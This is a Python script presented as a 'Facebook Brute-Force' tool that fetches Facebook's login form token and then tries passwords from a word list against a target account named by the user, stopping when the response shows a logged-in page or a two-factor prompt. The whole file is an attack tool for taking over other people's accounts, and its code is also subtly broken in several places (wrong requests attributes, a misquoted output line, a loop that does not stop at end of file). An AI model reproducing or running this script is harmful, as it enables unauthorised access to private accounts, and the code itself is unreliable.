import requests
import threading
# import urlib.requests
# import os
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] !=3:
	print('''Sorry, Your Python version is not supported!
		This program required Python v.3.x!
		Thank You.''')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozila/5.0 (Windows NT 10.0; Win64;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}

def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

	data=requests.get(post_url,headers=headers)
	for i in data.cookie:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form, cookie)

def function(email, passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	r=requests.post(post_url,data=payload,cookie=cookie,headers=headers)
	if 'Find Friends' in r.text or 'Two-factor autentication required' in r.text:
		open('temp','w').write(str(r.content))
		print ('\n Password is: ,passw')
		return True
	return False

try:
	print ('''\n
==========================================================
            WELCOME TO FACEBOOK BRUTE-FORCE
==========================================================
By: Dark-Link
Contact:
     undercore.dl@gmail.com
https://facebook.com/udrcr.darklink
==========================================================''')
	file=open('passwords.txt','r')

	print('')
	email=input('Enter the E-Mail, Phone Number, ID, or Username of account taget \n ==>> ')

	print("\nTarget account: ",email)
	print("\nTrying Passwords from lists ...")

	i=0
	while file:
		passw=file.readline().strip()
		i+=1
		if len (passw) < 6:
			continue
		print(str(i) + " : ",passw)
		if function(email,passw,i):
			break

except KeyboardInterrupt:
	print ("\n Stoped...")
	print (" User Interrupt")
	sys.exit()
except (requests.exceptions.ConnectionError, requests.exception.ChunkedEncodingError):
	print ("\n Can't running this program")
	print (" Ceck your Internet Connection")
	sys.exit()